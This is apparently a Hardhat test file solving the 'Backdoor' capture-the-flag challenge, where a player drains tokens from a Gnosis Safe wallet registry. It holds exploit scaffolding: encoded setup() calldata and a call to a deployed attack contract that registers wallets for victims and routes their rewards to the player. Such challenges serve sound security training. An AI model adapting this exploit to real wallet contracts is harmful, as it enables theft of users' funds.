const {ethers} = require('hardhat');
const {expect} = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, player;
    let masterCopy, walletFactory, token, walletRegistry;

    const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;
    const ONE_FOURTH_AMOUNT_TOKENS_DISTRIBUTED = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy the registry
        walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            masterCopy.address,
            walletFactory.address,
            token.address,
            users
        );
        expect(await walletRegistry.owner()).to.eq(deployer.address);

        for (let i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.true;

            // User cannot add beneficiaries
            await expect(
                walletRegistry.connect(
                    await ethers.getSigner(users[i])
                ).addBeneficiary(users[i])
            ).to.be.reverted;
        }

        console.log("walletRegistry :" + walletRegistry.address)
        console.log("masterCopy :" + masterCopy.address)
        console.log("walletFactory :" + walletFactory.address)
        console.log("alice :" + alice.address)
        console.log("bob :" + bob.address)
        console.log("charlie :" + charlie.address)
        console.log("david :" + david.address)
        console.log("player :" + player.address)
        console.log("player :" + player.address)
        console.log("token :" + token.address)

        // Transfer tokens to be distributed to the registry
        await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Execution', async function () {
        // const tnx = await walletFactory.createProxyWithCallback(masterCopy.address, "0xb63e800d00000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb200000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000009fe46736679d2d9a65f0992f2272de9f3c7fa6e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000000400000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc00000000000000000000000090f79bf6eb2c4f870365e785982e1f101e93b90600000000000000000000000015d34aaf54267db7d7c367839aaf71a00a2c6a6500000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000" , 0, walletRegistry.address);
        const ABI = [
            // "function transfer(address to, uint amount)"
            // "function transferFrom(address sender,address recipient,uint amount)"
            "function approve(address spender,uint amount)",
            "function setup(address[] _owners,uint256 _threshold,address to,bytes calldata data,address fallbackHandler, address paymentToken,uint256 payment,address payable paymentReceiver)"


        ];
        const iface = new ethers.utils.Interface(ABI);
        // const byteArr = iface.encodeFunctionData("setup", [[player.address], 1, player.address, 0x00, player.address, token.address, 10, player.address])
        // const byteArr = iface.encodeFunctionData("setup", [[player.address], 1, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), 0x00, player.address, token.address, 10, player.address])
        const byteArr = iface.encodeFunctionData("setup", [[alice.address], 1, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, 0, player.address])
        // const byteArr = iface.encodeFunctionData("setup", [[alice.address, bob.address,charlie.address, david.address], 4, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, 0, player.address])

        // console.log(byteArr);
        // console.log("0xb63e800d000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009fe46736679d2d9a65f0992f2272de9f3c7fa6e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c800000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000");

        // const tnx = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, "0xb63e800d000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009fe46736679d2d9a65f0992f2272de9f3c7fa6e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009965507d1a55bcc2695c58ba16fb37d819b0a4dc000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c800000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000" , 0, walletRegistry.address);
        // await tnx.wait();
        //
        // const byteArr1 = iface.encodeFunctionData("setup", [[alice.address], 1, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, AMOUNT_TOKENS_DISTRIBUTED, player.address])
        // const tnx1 = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, byteArr1 , 0, walletRegistry.address);
        // await tnx1.wait();

        // const byteArr2 = iface.encodeFunctionData("setup", [[bob.address], 1, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, AMOUNT_TOKENS_DISTRIBUTED, player.address])
        // const tnx2 = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, byteArr2 , 0, walletRegistry.address);
        // await tnx2.wait();
        //
        // const byteArr3 = iface.encodeFunctionData("setup", [[charlie.address], 1, player.address, 0x00, ethers.utils.getAddress("0x0000000000000000000000000000000000000000"), token.address, AMOUNT_TOKENS_DISTRIBUTED, player.address])
        // const tnx3 = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, byteArr3 , 0, walletRegistry.address);
        // await tnx3.wait();
        //
        const byteArr1 = iface.encodeFunctionData("setup",
            [
                [david.address],
                1,
                player.address,
                0x00,
                ethers.utils.getAddress("0x0000000000000000000000000000000000000000"),
                ethers.utils.getAddress("0x0000000000000000000000000000000000000000"),
                0, player.address
            ])
        // console.log("byteArr1 : " + byteArr1);
             const attackContract = await (await ethers.getContractFactory('AttackGenosisSafe', deployer)).deploy(walletFactory.address, masterCopy.address, walletRegistry.address);
        console.log("attackContract address : " + attackContract.address)

        // const tnx4 = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, byteArr1, 0, walletRegistry.address);
        const tnx4 = await attackContract.connect(player).attack(alice.address,bob.address,charlie.address, david.address, token.address);
        await tnx4.wait();


        /** CODE YOUR SOLUTION HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player must have used a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

        for (let i = 0; i < users.length; i++) {
            let wallet = await walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            // console.log("wallet : " + wallet)
            // console.log("beneficiaries : " + users[i])
            expect(wallet).to.not.eq(
                ethers.constants.AddressZero,
                'User did not register a wallet'
            );

            // User is no longer registered as a beneficiary
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});